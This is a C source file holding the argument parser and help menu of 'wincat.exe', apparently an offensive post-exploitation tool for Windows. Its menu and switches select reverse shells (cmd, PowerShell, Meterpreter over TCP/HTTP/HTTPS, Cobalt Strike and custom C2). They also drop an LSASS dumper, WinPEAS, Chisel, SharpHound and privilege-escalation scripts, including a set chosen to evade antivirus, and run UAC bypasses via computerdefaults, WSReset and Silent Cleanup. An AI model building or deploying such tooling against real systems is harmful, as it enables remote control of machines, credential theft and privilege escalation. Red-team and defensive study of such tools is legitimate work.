#include <windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "Message.h"
#include "GetDefaultPath.h"

#define MAX_IP_ADDR_SIZE 15
#define MIN_IP_ADDR_SIZE 7

BOOL IsStrDigit(char* digit) {
    for (char* pTmp = digit; *pTmp; pTmp++)
        if (isdigit(pTmp[0]) == 0)
            return FALSE;
    return TRUE;
}

BOOL IsIpAddressValid(WCHAR* ipAddress) {
    char ipAddrBuff[MAX_IP_ADDR_SIZE + 1];
    char* ptrDot;
    char* nextToken = NULL;
    int nbDot;
    int ipAddrLen = (int)wcslen(ipAddress);

    if (ipAddrLen < MIN_IP_ADDR_SIZE || ipAddrLen > MAX_IP_ADDR_SIZE)
        return FALSE;
    sprintf_s(ipAddrBuff, MAX_IP_ADDR_SIZE + 1, "%ws", ipAddress);
    ptrDot = strtok_s(ipAddrBuff, ".", &nextToken);

    for (nbDot = 0; ptrDot != NULL && nbDot < 5; nbDot++) {
        int num;
        if (!IsStrDigit(ptrDot))
            return FALSE;
        num = atoi(ptrDot);
        if (num < 0 || num > 255)
            return FALSE;
        ptrDot = strtok_s(NULL, ".", &nextToken);
    }
    if (nbDot - 1 != 3)
        return FALSE;
    return TRUE;
}

BOOL IsPortValid(int portNb) {
    return (portNb > 0 && portNb < 65353);
}

VOID PrintMenu(char* workingDirecotry) {
#if _WIN64
    BOOL isX64 = TRUE;
#else
    BOOL isX64 = FALSE;
#endif
    printf("\nMultiple reverse shell (CMD/PS/CS/MSF_RECV_TCP/MSF_RECV_HTTP/MSF_RECV_HTTPS).\n\n");

    printf("wincat.exe RHOST RPORT [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-P cmd/ps/cs/cshell/rtcp/http/https] [winpeas/chisel/shound/all/safe/...]\n");
    printf("wincat.exe RHOST RPORT getsystem [-uac 1/2/3]\n");
    printf("wincat.exe RHOST RPORT detached\n");
    printf("wincat.exe [wget/winpeas/chisel/shound/all/safe/...]\n\n");

    printf("Required: \n");
    printf("\tRHOST\t\tRemote IP address\n");
    printf("\tRPORT\t\tRemote port\n\n");



    printf("Change user:\n");
    printf("\t-u\t\tThe username to run the reverse shell\n");
    printf("\t-p\t\tThe password to run the reverse shell\n");
    printf("\t-d\t\tThe domain to run the reverse shell\n\n");

    printf("Select payload:\n");
    printf("\t-P cmd\t\tRun the shell with the classic shell\t[DEFAULT]\n");
    printf("\t-P ps\t\tRun the shell with powershell\n");
    printf("\t-P cs\t\tRun use Cobalt Strike external C2\n");
    printf("\t-P cshell\tRun use a custom shell (Also custom C2)\n");
    printf("\t-P rtcp\t\tRun the meterpreter with reverse tcp\n");
    printf("\t\t\t   To run handler (%s): 'set payload windows/%smeterpreter/reverse_tcp'\n", isX64 ? "x64" : "x86", isX64 ? "x64/" : "");
    printf("\t-P http\t\tIf you want to run the meterpreter with reverse http\n");
    printf("\t\t\t   To run handler (%s): 'set payload windows/%smeterpreter/reverse_http'\n", isX64 ? "x64" : "x86", isX64 ?"x64/":"");
    printf("\t-P https\tIf you want to run the meterpreter with reverse http\n");
    printf("\t\t\t   To run handler (%s): 'set payload windows/%smeterpreter/reverse_https'\n\n", isX64 ? "x64" : "x86", isX64 ?"x64/":"");


    printf("File to drop:\n");
    printf("\taccesschk\tSysinternals\t\tCheck access permission for specific users or groups.\n");
    printf("\twinpeas\t\tWinPEAS(%s)\t\tPrivilege Escalation Awesome Scripts SUITE.\n", isX64 ? "x64" : "x86");
    printf("\tchisel\t\tChisel(%s)\t\tA fast TCP tunnel over HTTP.\n", isX64 ? "x64" : "x86");
    printf("\tlsass\t\tCustom tools(%s)\tDump process lsass.\n", isX64 ? "x64" : "x86");
    printf("\tnetIG\t\tCustom tools(%s)\tPerform a network scan and gather information.\n", isX64 ? "x64" : "x86");
    printf("\ttestav\t\tCustom tools(%s)\tTest EDR detection with eicar files\n", isX64 ? "x64" : "x86");
    printf("\tligolong\tligolo-ng\t\tTunneling like a VPN.\n");
    printf("\tshound\t\tSharpHound\t\tBloodHound Ingestor.\n");
    printf("\tpowerup\t\tPowershell\t\tTool to assist with LPE.\n");
    printf("\tprivesccheck\tPowershell\t\tTool to assist with LPE.\n");
    printf("\tsherlock\tPowershell\t\tTool to quickly find missing software patches for LPE.\n");
    printf("\tadrecon\t\tPowershell\t\tTool which gathers information about the Active Directory.\n\n");

    printf("\tall\t\tDrop all the tools and scripts on the system.\n");
    printf("\tsafe\t\tDrop the tools that won't get detected by an AV (DropLsass, NetworkIG, ligolo-ng, ...).\n\n");



    printf("Others:\n");
    printf("\tgetsystem\tExploit that bypass UAC and upgrade to system (Need to be in the admin group).\n");
    printf("\t\t\t-uac\t1: UAC bypass technique: 'computerdefaults'.\n");
    printf("\t\t\t-uac\t2: UAC bypass technique: 'WSReset'. \t\t[DEFAULT]\n");
    printf("\t\t\t-uac\t3: UAC bypass technique: 'Silent Cleanup'.\n");
    printf("\tdetached\tRun wincat with a new process.\n\n");
    //printf("Note:\n");
    //printf("\tThe path where the tools are drop is in '%s'.\n\n",workingDirecotry);
}
BOOL GetArguments(int argc, WCHAR* argv[], pArguments listAgrument) {
    LPCWSTR ProcessCmd = L"C:\\windows\\system32\\cmd.exe";
    LPCWSTR ProcessPs = L"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"; // C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
    int checkTypeCShell = 0;
    const char* wincatDefaultDir = "C:\\programdata\\WinTools";
    const char* wincatDefaultPath = "C:\\programdata\\WinTools\\wincat.exe";

    listAgrument->wincatDefaultDir = (char*)wincatDefaultDir;
    listAgrument->wincatDefaultPath = (char*)wincatDefaultPath;
    listAgrument->Process = ProcessCmd;
    listAgrument->lpszUsername[0] = 0x00;
    listAgrument->lpszPassword[0] = 0x00;
    listAgrument->lpszDomain[0] = 0x00;
    listAgrument->payloadType = PAYLOAD_RECV_CMD;
    listAgrument->Detached = FALSE;
    listAgrument->GetSystem = FALSE;
    listAgrument->toDROP = Nothing;

    if (argc == 2) {
        if (lstrcmpW(argv[1], L"accesschk") == 0)
            listAgrument->toDROP = Dropaccesschk;
        else if (lstrcmpW(argv[1], L"winpeas") == 0)
            listAgrument->toDROP = DropWinPEAS;
        else if (lstrcmpW(argv[1], L"chisel") == 0)
            listAgrument->toDROP = DropChisel;
        else if (lstrcmpW(argv[1], L"lsass") == 0) 
            listAgrument->toDROP = DroppertLsass;
        else if (lstrcmpW(argv[1], L"netIG") == 0)
            listAgrument->toDROP = DropNetworkInfoGather;
        else if (lstrcmpW(argv[1], L"testav") == 0)
            listAgrument->toDROP = DropTestAvEicat;
        else if (lstrcmpW(argv[1], L"ligolong") == 0)
            listAgrument->toDROP = DropLigolong_agent;
        else if (lstrcmpW(argv[1], L"shound") == 0)
            listAgrument->toDROP = DropSharpHound;
        else if (lstrcmpW(argv[1], L"powerup") == 0)
            listAgrument->toDROP = DropPowerUp;
        else if (lstrcmpW(argv[1], L"privesccheck") == 0)
            listAgrument->toDROP = DropPrivescCheck;
        else if (lstrcmpW(argv[1], L"sherlock") == 0)
            listAgrument->toDROP = DropSherlock;
        else if (lstrcmpW(argv[1], L"adrecon") == 0)
            listAgrument->toDROP = DropADRecon;
        else if (lstrcmpW(argv[1], L"all") == 0 || lstrcmpW(argv[1], L"ALL") == 0)
            listAgrument->toDROP = ALL;
        else if (lstrcmpW(argv[1], L"safe") == 0 || lstrcmpW(argv[1], L"SAFE") == 0)
            listAgrument->toDROP = SAFE;
        else {
            PrintMenu(listAgrument->wincatDefaultDir);
            return FALSE;
        }
        if (strcmp(listAgrument->wincatDefaultDir, wincatDefaultDir) == 0) {
            if (GetDefaultPath(&(listAgrument->wincatDefaultDir), &(listAgrument->wincatDefaultPath)))
                printMsg(STATUS_INFO, LEVEL_DEFAULT, "Target path: '%s'\n", listAgrument->wincatDefaultDir);
            else
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "No target path was found");
        }
        return TRUE;
    }
    if (argc < 3) {
        PrintMenu(listAgrument->wincatDefaultDir);
        return FALSE;
    }
    lstrcpyW(listAgrument->host, argv[1]);
    listAgrument->port = _wtoi(argv[2]);

    if (!IsIpAddressValid(listAgrument->host)) {
        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Invalid ip address '%ws'", argv[1]);
        return FALSE;
    }
    if (!IsPortValid(listAgrument->port)) {
        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Invalid port '%ws' (Range: 0-65353)", argv[2]);
        return FALSE;
    }

    for (int count = 3; count < argc; count++) {
        if ((argv[count][0] == L'-' ||   argv[count][0] == L'/') && lstrlenW(argv[count]) > 1) {
            if (argv[count][1] == L'u' && argc >= count) {
                lstrcpyW(listAgrument->lpszUsername, argv[count + 1]);
                count++;
            }else if (argv[count][1] == L'p' && argc >= count) {
                lstrcpyW(listAgrument->lpszPassword, argv[count + 1]);
                count++;
            }else if (argv[count][1] == L'd' && argc >= count) {
                lstrcpyW(listAgrument->lpszDomain, argv[count + 1]);
                count++;


            }else if (argv[count][1] == L'P' && argc >= count) {
                if (lstrcmpW(argv[count + 1], L"ps") == 0) {
                    listAgrument->Process = ProcessPs;
                    listAgrument->payloadType = PAYLOAD_RECV_PS;
                    checkTypeCShell++;
                } else if (lstrcmpW(argv[count + 1], L"cmd") == 0) {
                    listAgrument->Process = ProcessCmd;
                    listAgrument->payloadType = PAYLOAD_RECV_CMD;
                    checkTypeCShell++;
                } else if (lstrcmpW(argv[count + 1], L"rtcp") == 0) {
                    listAgrument->payloadType = PAYLOAD_MSF_RECV_TCP;
                    checkTypeCShell++;
                } else if (lstrcmpW(argv[count + 1], L"http") == 0) {
                    listAgrument->payloadType = PAYLOAD_MSF_RECV_HTTP;
                    checkTypeCShell++;
                } else if (lstrcmpW(argv[count + 1], L"https") == 0) {
                    listAgrument->payloadType = PAYLOAD_MSF_RECV_HTTPS;
                    checkTypeCShell++;
                } else if (lstrcmpW(argv[count + 1], L"cs") == 0) {
                    listAgrument->payloadType = PAYLOAD_CS_EXTERNAL_C2;
                    checkTypeCShell++;
                } else if (lstrcmpW(argv[count + 1], L"cshell") == 0) {
                    listAgrument->payloadType = PAYLOAD_CUSTOM_SHELL;
                    checkTypeCShell++;
                }
                count++;
            }else if ((argv[count][1] == L'h'|| argv[count][1] == L'?' || lstrcmpW(argv[count], L"--help") == 0) && argc >= count) {
                PrintMenu(listAgrument->wincatDefaultDir);
                return FALSE;
            }else
                printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Unknown argument %ws\n", argv[count]);
        }else {
            if (lstrcmpW(argv[count], L"getsystem") == 0) {
                listAgrument->GetSystem = TRUE;
                listAgrument->UacBypassTec = UAC_BYPASS_COMP_WSREST;
                if (argc == count + 2 + 1 && lstrcmpW(argv[count], L"-uac")) {
                    int tecNum = _wtoi(argv[count + 2]);
                    if (tecNum > 0 && tecNum < 4) {
                        listAgrument->UacBypassTec = tecNum - 1;
                    }
                }
            } else if (lstrcmpW(argv[count], L"detached") == 0) {
                listAgrument->Detached = TRUE;

            }else if (lstrcmpW(argv[count], L"accesschk") == 0) {
                listAgrument->toDROP = Dropaccesschk;
            }else if (lstrcmpW(argv[count], L"winpeas") == 0) {
                listAgrument->toDROP = DropWinPEAS;
            }else if (lstrcmpW(argv[count], L"chisel") == 0) {
                listAgrument->toDROP = DropChisel;
            } else if (lstrcmpW(argv[count], L"lsass") == 0) {
                listAgrument->toDROP = DroppertLsass;
            } else if (lstrcmpW(argv[count], L"netIG") == 0) {
                listAgrument->toDROP = DropNetworkInfoGather;
            } else if (lstrcmpW(argv[count], L"ligolong") == 0) {
                listAgrument->toDROP = DropLigolong_agent;
            } else if (lstrcmpW(argv[count], L"shound") == 0) {
                listAgrument->toDROP = DropSharpHound;
            } else if (lstrcmpW(argv[count], L"powerup") == 0) {
                listAgrument->toDROP = DropPowerUp;
            } else if (lstrcmpW(argv[count], L"privesccheck") == 0) {
                listAgrument->toDROP = DropPrivescCheck;
            } else if (lstrcmpW(argv[count], L"sherlock") == 0) {
                listAgrument->toDROP = DropSherlock;
            } else if (lstrcmpW(argv[count], L"adrecon") == 0) {
                listAgrument->toDROP = DropADRecon;
            }else if (lstrcmpW(argv[count], L"all") == 0 || lstrcmpW(argv[count], L"ALL") == 0) {
                listAgrument->toDROP = ALL;
            }else if (lstrcmpW(argv[count], L"safe") == 0 || lstrcmpW(argv[count], L"SAFE") == 0) {
                listAgrument->toDROP = SAFE;
            }else 
                printMsg(STATUS_INFO, LEVEL_DEFAULT, "Unknown argument %ws\n", argv[count]);
        }
    }
    if (strcmp(listAgrument->wincatDefaultDir, wincatDefaultDir) == 0) {
        if (GetDefaultPath(&(listAgrument->wincatDefaultDir),&(listAgrument->wincatDefaultPath)))
            printMsg(STATUS_INFO, LEVEL_DEFAULT, "Target path: '%s'\n", listAgrument->wincatDefaultDir);
        else
            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "No target path was found");
    }

    if (checkTypeCShell > 1) {
        PrintMenu(listAgrument->wincatDefaultDir);
        return FALSE;
    }
    return TRUE;
}